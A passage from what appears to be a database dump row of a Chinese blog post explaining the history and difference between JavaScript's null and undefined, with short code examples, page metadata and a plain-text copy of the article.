Eich又设计了一个undefined。</p>\n\n<h2>三、最初设计</h2>\n\n<p>JavaScript的最初版本是这样区分的：<strong>null是一个表示"无"的对象，转为数值时为0；undefined是一个表示"无"的原始值，转为数值时为NaN。</strong></p>\n\n<blockquote><pre><code class="language-javascript">\nNumber(undefined)\n// NaN\n\n5 + undefined\n// NaN\n\n</code></pre></blockquote>\n\n<h2>四、目前的用法</h2>\n\n<p>但是，上面这样的区分，在实践中很快就被证明不可行。目前，null和undefined基本是同义的，只有一些细微的差别。</p>\n\n<p><strong>null表示"没有对象"，即该处不应该有值。</strong>典型用法是：</p>\n\n<blockquote>\n  <p>（1） 作为函数的参数，表示该函数的参数不是对象。</p>\n\n<p>（2） 作为对象原型链的终点。</p>\n</blockquote>\n\n<blockquote><pre><code class="language-javascript">\nObject.getPrototypeOf(Object.prototype)\n// null\n\n</code></pre></blockquote>\n\n<p><strong>undefined表示"缺少值"，就是此处应该有一个值，但是还没有定义。</strong>典型用法是：</p>\n\n<blockquote>\n  <p>（1）变量被声明了，但没有赋值时，就等于undefined。</p>\n\n<p>（2) 调用函数时，应该提供的参数没有提供，该参数等于undefined。</p>\n\n<p>（3）对象没有赋值的属性，该属性的值为undefined。</p>\n\n<p>（4）函数没有返回值时，默认返回undefined。</p>\n</blockquote>\n\n<blockquote><pre><code class="language-javascript">\nvar i;\ni // undefined\n\nfunction f(x){console.log(x)}\nf() // undefined\n\nvar  o = new Object();\no.p // undefined\n\nvar x = f();\nx // undefined\n\n</code></pre></blockquote>\n\n<p>（完）</p>\n\n        <div><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名（<a href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）</li>\n<li>发表日期： <abbr class="published" title="2014-03-28T11:13:46+08:00">2014年3月28日</abbr></li>\n<li>更多内容： <a href="http://www.ruanyifeng.com/blog/archives.html" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 档案</a>  » \n<a href="http://www.ruanyifeng.com/blog/javascript/"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> JavaScript</a> \n</li>\n<li>付费支持：<a href="http://www.ruanyifeng.com/blog/2014/05/my_blog_book.html" target="_blank"><img src="data:image/png;base64,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" style="border: 0;" /> 购买文集</a></li>\n<li>社交媒体：<a href="https://twitter.com/ruanyf" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAk1JREFUeNqsVc9rE0EU/mZ3dhPNJl2bVIk/Km09aFBE8GLvnrwJXvwLxIsgCP4Fnit6E8Gb0IMHwUsL9SSNgiAoooJIpE1Joo1h82uT7IxvxmRN3Q32kAdvdrI773vfe+/bDTu9WioDcDAda3Ja8piepQ1avCkCeny0Y+R9KenKwOmHHLvPaKn7AtVOoO8dOWDCMpg+41gMQv5FNEJACgoE8MsPNLDBhgfoutMOsJDmWLmU037C4TApciljwQ/kHoohQxV06+wMXNvE7WINuaSpvdYVKLgWnl3O4zAxU3Z1IYVGT+B5qYWV9z2kbQaT/cOwTsxOUUYF+mB5Dkmi8HG3h2q9hxsFNwRTdvQgxxnXRrMvIdkEhllis/qtiWuLDm4WZnBlPoWnXz28LHdw0uGR7m9Wu3j0qYGEubfn4UlBfXO4gTZltRNMg9w9f0i7kNFxllsBlS0x75gYfxyWTBUjT2W5CSMSPBrQuG21+hiMDS8CeCzF8eSLp13uQ3Ab1IqMFZN8tFHPmgOBF99bYP8Be1Xp6t7OJszJgKpPSiZvaj7uf2hguz2IBQuozDvFH6RDBjuK9wdQDvt0nMpW+8efGyh5UcAeZb2+UcHbnz5Jx4wdlp4yJYU3kLiQtfBwOYeLc8nIwfXtNu69q2Oz4mMxbemYOOOjKarhvq51KUjg3GwiFPIuvcNF6pnSnWK0lOEabNLgQh1aJFAhlGB9rG110B2+oyRNPc0sZbRNFltmLKDKqj4Qrm1ojzOxDz2pyPQ0P7CK4c40/wJ+CzAAGYrXsvfFXR4AAAAASUVORK5CYII=" style="border: 0;" /> twitter</a>，<a href="http://weibo.com/ruanyf" target="_blank"><img src="data:image/png;base64,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" style="border: 0;" /> weibo</a></li>\n<li>Feed订阅： <a href="http://www.ruanyifeng.com/feed.html" target="_blank"><img src="data:image/gif;base64,R0lGODlhFAAUANU2APV1GfmrePZ8IeR5VPq2ieNkLf7p3NpFJveCJ/NoFfibVPR1IexiJfvdzuZrNfXGuOhUEueTevaFOfzIpNxDGeZZJNU6IOubifiVTfOnid1aLuZpLOFSJf/28vJtIvGcefaLSd5kNu9iFv/z6//48//t4uFfLfNkCeJNGuGNc/rCof/+/PVxEeldI/V5KeKMbu9nIvB2OvzQtNxMKfOPXP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAADYALAAAAAAUABQAAAb/QJstEjKZCsjCZsl0pIS2QWXaYsA8noVWIEAgFoNhhWNyMESi7Jbr/aZCFdRnZJAFJCwAt+vlOkwtEBk1hDUkExJ6bQJaGyYMLTQTDSOFHQF8jAseSFYiJwkuAQ2FE1xaHjBIMDAgARguJwABJIQTLJswDEgeIgSEJQQILAqVNQEiui1HHgkBhTUGCiwYtR0xLS0VJhtaEgoEBoQkGCfPNSoQY9xaCwAsCBPALgmkJA4cZN0CAAgY/PJqEIDwgVAECjM0bOAnwcAKGQJclKhRgoGDDjUeUDigkN8vQiBOfByAglSDAxw3IBCgYEU0FyJoEPpA4UGNDjMsaHDQR8EdPVYOMmQYQGHAhQgHLIRIsWAlgASsGMRBMWMGBQtYZ7yIsoBRKkhjOMxAiXJGGCEpHGxIYsSIhrcaQmy1EQQAOw==" style="border: 0;" /></a></li>\n\n</ul></div>        \n        <div><p><strong>[广告]</strong>　<a href="http://memoryhere.com/?utm_source=ruanyifeng.com" style="border: none;" target="_blank">生命链记忆网是永远在线的个人史馆，是永恒的信息载体，永久保留每个人的人生记忆和生命轨迹直至千秋万代。</a>\n</p>\n\n</div>', '2014-11-06 23:42:47', 2, '2014-10-28 11:53:24', '2014-03-28 03:13:46', 0, '[["undefined", 0.7453096946945137], ["null", 0.6558725313311721], ["JavaScript", 0.3577486534533666], ["var", 0.14906193893890274], ["false", 0.14906193893890274], ["Eich", 0.1192495511511222], ["Brendan", 0.1192495511511222], ["\\u8bed\\u8a00", 0.10759222698], ["\\u5bf9\\u8c61", 0.1029748471749626], ["\\u8d4b\\u503c", 0.09717500816578553], ["\\u8f6c\\u4e3a", 0.09235565850523692], ["console", 0.08943716336334165], ["Java", 0.08943716336334165], ["Object", 0.08943716336334165], ["log", 0.08943716336334165], ["NaN", 0.08943716336334165], ["\\u8868\\u793a", 0.08782780546369078], ["\\u7528\\u6cd5", 0.08518090260618454], ["\\u53c2\\u6570", 0.06977480673975063], ["\\u81ea\\u52a8", 0.06465134233476309]]', 1, NULL, '大多数计算机语言，有且仅有一个表示"无"的值，比如，C语言的NULL，Java语言的null，Python语言的None，Ruby语言的nil。\n\n        有点奇怪的是，JavaScript语言居然有两个表示"无"的值：undefined和null。这是为什么？\n\n\n\n一、相似性\n\n在JavaScript中，将一个变量赋值为undefined或null，老实说，几乎没区别。\n\n\nvar a = undefined;\n\nvar a = null;\n\n\n\n上面代码中，a变量分别被赋值为undefined和null，这两种写法几乎等价。\n\nundefined和null在if语句中，都会被自动转为false，相等运算符甚至直接报告两者相等。\n\n\nif (!undefined) \n    console.log(''undefined is false'');\n// undefined is false\n\nif (!null) \n    console.log(''null is false'');\n// null is false\n\nundefined == null\n// true\n\n\n\n上面代码说明，两者的行为是何等相似！\n\n既然undefined和null的含义与用法都差不多，为什么要同时设置两个这样的值，这不是无端增加JavaScript的复杂度，令初学者困扰吗？Google公司开发的JavaScript语言的替代品Dart语言，就明确规定只有null，没有undefined！\n\n二、历史原因\n\n最近，我在读新书《Speaking JavaScript》时，意外发现了这个问题的答案！\n\n原来，这与JavaScript的历史有关。1995年JavaScript诞生时，最初像Java一样，只设置了null作为表示"无"的值。\n\n根据C语言的传统，null被设计成可以自动转为0。\n\n\nNumber(null)\n// 0\n\n5 + null\n// 5\n\n\n\n但是，JavaScript的设计者Brendan Eich，觉得这样做还不够，有两个原因。\n\n首先，null像在Java里一样，被当成一个对象。但是，JavaScript的数据类型分成原始类型（primitive）和合成类型（complex）两大类，Brendan Eich觉得表示"无"的值最好不是对象。\n\n其次，JavaScript的最初版本没有包括错误处理机制，发生数据类型不匹配时，往往是自动转换类型或者默默地失败。Brendan Eich觉得，如果null自动转为0，很不容易发现错误。\n\n因此，Brendan Eich又设计了一个undefined。\n\n三、最初设计\n\nJavaScript的最初版本是这样区分的：null是一个表示"无"的对象，转为数值时为0；undefined是一个表示"无"的原始值，转为数值时为NaN。\n\n\nNumber(undefined)\n// NaN\n\n5 + undefined\n// NaN\n\n\n\n四、目前的用法\n\n但是，上面这样的区分，在实践中很快就被证明不可行。目前，null和undefined基本是同义的，只有一些细微的差别。\n\nnull表示"没有对象"，即该处不应该有值。典型用法是：\n\n\n  （1） 作为函数的参数，表示该函数的参数不是对象。\n\n（2） 作为对象原型链的终点。\n\n\n\nObject.getPrototypeOf(Object.prototype)\n// null\n\n\n\nundefined表示"缺少值"，就是此处应该有一个值，但是还没有定义。典型用法是：\n\n\n  （1）变量被声明了，但没有赋值时，就等于undefined。\n\n（2) 调用函数时，应该提供的参数没有提供，该参数等于undefined。\n\n（3）对象没有赋值的属性，该属性的值为undefined。\n\n（4）函数没有返回值时，默认返回undefined。\n\n\n\nvar i;\ni // undefined\n\nfunction f(x){console.log(x)}\nf() // undefined\n\nvar  o = new Object();\no.p // undefined\n\nvar x = f();\nx // undefined\n\n\n\n（完）\n\n        文档信息\n\n版权声明：自由转载-非商用-非衍生-保持署名（创意共享3.0许可证）\n发表日期： 2014年3月28日\n更多内容：  档案  » \n  JavaScript \n\n付费支持： 购买文集\n社交媒体： twitter， weibo\nFeed订阅： \n\n        \n        [广告]　生命链记忆网是永远在线的个人史馆，是永恒的信息载体，永久保留每个人的人生记忆和生命轨迹直至千秋万代。\n\n\n', NULL, NULL, NULL),
